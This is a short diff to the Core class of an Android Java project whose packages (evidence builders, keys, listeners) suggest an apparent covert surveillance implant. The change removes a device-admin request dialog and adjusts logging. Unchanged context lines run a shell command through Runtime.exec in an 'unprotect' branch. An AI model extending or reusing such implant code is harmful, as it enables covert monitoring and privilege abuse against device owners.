@@ -27,7 +27,6 @@ import com.android.dvci.evidence.EvDispatcher;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
-import com.android.dvci.gui.ASG;
 import com.android.dvci.listener.BSm;
 import com.android.dvci.manager.ManagerEvent;
 import com.android.dvci.manager.ManagerModule;
@@ -271,7 +270,7 @@ public class Core extends Activity implements Runnable {
 
 		Keys keys = Keys.self();
 
-		if(!keys.enabled()){
+		if (!keys.enabled()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (run) Error: This board is disabled");
 			}
@@ -305,17 +304,15 @@ public class Core extends Activity implements Runnable {
 				Runtime.getRuntime().exec(tbe);
 
 			} catch (IOException ex) {
-				Check.log(TAG + " Error (unprotect): " + ex);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (run): " + ex);
+				}
 			}
 		} else if (Keys.self().wantsPrivilege()) {
-			ASG gui = Status.getAppGui();
-
-			if (gui != null) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (run) calling gui admin");
-				}
-				gui.deviceAdminRequest();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error (run): cannot ask for privileges");
 			}
+
 		}
 
 		try {
